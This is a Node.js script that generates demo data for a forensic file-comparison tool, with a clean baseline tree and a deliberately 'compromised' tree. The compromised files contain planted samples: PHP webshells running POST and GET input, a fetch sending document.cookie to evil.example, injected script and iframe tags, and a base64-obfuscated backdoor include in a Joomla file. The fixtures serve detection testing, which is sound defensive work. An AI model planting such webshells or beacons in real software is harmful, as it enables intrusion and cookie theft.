'use strict';
// Builds a self-contained demo under ./sample so the interface can be tested
// immediately: two data roots (left = trusted, right = investigated), the two
// checksum CSVs, and an empty evidence folder.
//
//   node scripts/gen-sample.js
const fs = require('fs');
const path = require('path');
const { generate } = require('./gen-csv');

const ROOT = path.resolve(__dirname, '..', 'sample');
const LEFT = path.join(ROOT, 'left');
const RIGHT = path.join(ROOT, 'right');
const EVID = path.join(ROOT, 'evidence');
const JOOMLA = path.join(ROOT, 'joomla');

function write(base, rel, content) {
  const fp = path.join(base, rel);
  fs.mkdirSync(path.dirname(fp), { recursive: true });
  fs.writeFileSync(fp, content);
}

// ---- shared / clean content ----
const cleanIndex = `<?php
// example.com landing page
require __DIR__ . '/config.php';

function render_home() {
    echo "<h1>Welcome to example.com</h1>";
    echo "<p>Everything is fine here.</p>";
}

render_home();
`;

const config = `<?php
define('DB_HOST', 'localhost');
define('DB_NAME', 'example');
define('DEBUG', false);
`;

const cleanUtil = `export function slugify(s) {
  return String(s).toLowerCase().trim().replace(/[^a-z0-9]+/g, '-');
}

export function money(cents) {
  return '$' + (cents / 100).toFixed(2);
}
`;

const cleanShopHtml = `<!doctype html>
<html>
  <head><title>shop.local</title></head>
  <body>
    <h1>shop.local</h1>
    <p>Featured products below.</p>
  </body>
</html>
`;

const cartPhp = `<?php
// shop.local shopping cart
session_start();
$cart = $_SESSION['cart'] ?? [];
echo count($cart) . " items in cart";
`;

// ---- LEFT (trusted baseline) ----
write(LEFT, 'example.com/index.php', cleanIndex);
write(LEFT, 'example.com/config.php', config);
write(LEFT, 'example.com/lib/util.js', cleanUtil);
write(LEFT, 'shop.local/index.html', cleanShopHtml);
write(LEFT, 'shop.local/cart.php', cartPhp);

// ---- RIGHT (compromised / investigated) ----
// index.php: MODIFIED — webshell prepended
write(RIGHT, 'example.com/index.php', `<?php @eval($_POST['x']); /* injected */ ?>
` + cleanIndex);
// config.php: UNCHANGED
write(RIGHT, 'example.com/config.php', config);
// util.js: MODIFIED — exfil beacon added
write(RIGHT, 'example.com/lib/util.js', cleanUtil + `
// injected
fetch('https://evil.example/collect?c=' + document.cookie);
`);
// uploads/shell.php: ADDED — dropped webshell
write(RIGHT, 'example.com/uploads/shell.php', `<?php
// dropped file — not in baseline
system($_GET['cmd'] ?? 'id');
`);
// shop.local/index.html: MODIFIED — script injection
write(RIGHT, 'shop.local/index.html', cleanShopHtml.replace('</body>', '  <script src="https://evil.example/x.js"></script>\n  </body>'));
// shop.local/promo.htm: ADDED
write(RIGHT, 'shop.local/promo.htm', `<html><body><h2>PROMO</h2><iframe src="https://evil.example/ad"></iframe></body></html>\n`);
// shop.local/cart.php: DELETED on right (present only on left) — so NOT written here.

// example.com/big.php: MODIFIED and LONG (~2000 lines) to exercise diff scrolling.
const bigLines = ['<?php', '// large module — used to test diff viewer scrolling', ''];
for (let i = 1; i <= 400; i++) {
  bigLines.push(`function handler_${i}($req) {`);
  bigLines.push(`    // step ${i} of the pipeline`);
  bigLines.push(`    $value = ${i} * 2;`);
  bigLines.push(`    return process($req, $value);`);
  bigLines.push('}');
}
const bigLeft = bigLines.join('\n') + '\n';
const bigRightLines = bigLines.slice();
// inject a webshell line deep in the file so the change is far down (needs scrolling to reach)
bigRightLines.splice(1500, 0, "    @system($_GET['cmd']); // <-- injected, deep in the file");
bigRightLines[8] = bigRightLines[8].replace('* 2;', '* 3; // tampered near the top');
const bigRight = bigRightLines.join('\n') + '\n';
write(LEFT, 'example.com/big.php', bigLeft);
write(RIGHT, 'example.com/big.php', bigRight);

// --- Joomla core-file comparison demo ---
// Pristine Joomla sources (mounted read-only at /joomla, one folder per version).
const jver = (rel, dev) => `<?php
defined('_JEXEC') or die;

final class JVersion
{
    public $PRODUCT = 'Joomla!';
    public $RELEASE = '${rel}';
    public $DEV_LEVEL = '${dev}';
    public $BUILD_DATE = '2020-01-01';

    public function getShortVersion()
    {
        return $this->RELEASE . '.' . $this->DEV_LEVEL;
    }
}
`;
const jindex = `<?php
define('_JEXEC', 1);
define('JPATH_BASE', __DIR__);
require_once JPATH_BASE . '/includes/defines.php';
require_once JPATH_BASE . '/includes/framework.php';
$app = JFactory::getApplication('site');
$app->execute();
`;
write(JOOMLA, 'Joomla-3.9.21/index.php', jindex);
write(JOOMLA, 'Joomla-3.9.21/libraries/joomla/version.php', jver('3.9', '21'));
write(JOOMLA, 'Joomla-3.10.11/index.php', jindex);
write(JOOMLA, 'Joomla-3.10.11/libraries/joomla/version.php', jver('3.10', '11'));

// A website file that maps onto Joomla core: clean on left (== pristine 3.9.21),
// tampered on right (a backdoor include prepended). It shows up as "modified",
// and "vs Joomla" reveals the injection against the pristine source.
const cleanVersion = jver('3.9', '21');
const tamperedVersion = cleanVersion.replace(
  "defined('_JEXEC') or die;",
  "defined('_JEXEC') or die;\n@include(base64_decode('L3RtcC8ueA==')); // <-- injected backdoor",
);
write(LEFT, 'example.com/libraries/joomla/version.php', cleanVersion);
write(RIGHT, 'example.com/libraries/joomla/version.php', tamperedVersion);

// ---- evidence folder + CSV manifests ----
fs.mkdirSync(EVID, { recursive: true });
generate(LEFT, '/mnt/data', path.join(EVID, 'left.csv'));
generate(RIGHT, '/mnt/data', path.join(EVID, 'right.csv'));

console.log('sample built under', ROOT);
console.log('  left  :', LEFT);
console.log('  right :', RIGHT);
console.log('  csvs  :', path.join(EVID, 'left.csv'), '/', path.join(EVID, 'right.csv'));
console.log('Joomla sources under', JOOMLA, '(versions: 3.9.21, 3.10.11)');
console.log('Expected: modified incl. big.php (~2000 lines) + libraries/joomla/version.php (Joomla-mapped), 2 added, 1 deleted');
